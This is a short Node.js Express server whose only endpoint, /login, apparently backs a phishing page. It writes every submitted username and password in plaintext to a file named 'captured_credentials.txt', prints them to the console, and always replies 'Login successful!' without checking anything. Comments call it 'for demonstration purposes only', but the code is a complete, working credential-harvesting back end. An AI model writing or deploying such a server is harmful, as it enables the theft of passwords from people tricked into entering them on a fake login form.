// server.js
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const dotenv = require('dotenv');

// Load environment variables from .env file
dotenv.config();

const app = express();
const PORT = process.env.PORT || 5000; // Use environment variable for port

// Middleware
app.use(bodyParser.json());
app.use(cors({
  origin: process.env.FRONTEND_URL || 'http://localhost:3000', // Allow only your frontend URL
  credentials: true,
}));

// File path for storing credentials (for demonstration purposes only)
const CREDENTIALS_FILE = path.join(__dirname, 'captured_credentials.txt');

// Ensure the file exists
if (!fs.existsSync(CREDENTIALS_FILE)) {
  fs.writeFileSync(CREDENTIALS_FILE, ''); // Create an empty file if it doesn't exist
}

// Login endpoint
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // Validate input
  if (!username || !password) {
    return res.status(400).json({ message: 'Username and password are required' });
  }

  // Save the credentials to a file (for demonstration purposes only)
  const data = `Username: ${username}, Password: ${password}\n`;
  fs.appendFile(CREDENTIALS_FILE, data, (err) => {
    if (err) {
      console.error('Error writing to file:', err);
      return res.status(500).json({ message: 'Internal Server Error' });
    }

    // Log success (for debugging)
    console.log('Credentials saved:', { username, password });

    // Send success response
    res.status(200).json({ message: 'Login successful!' });
  });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});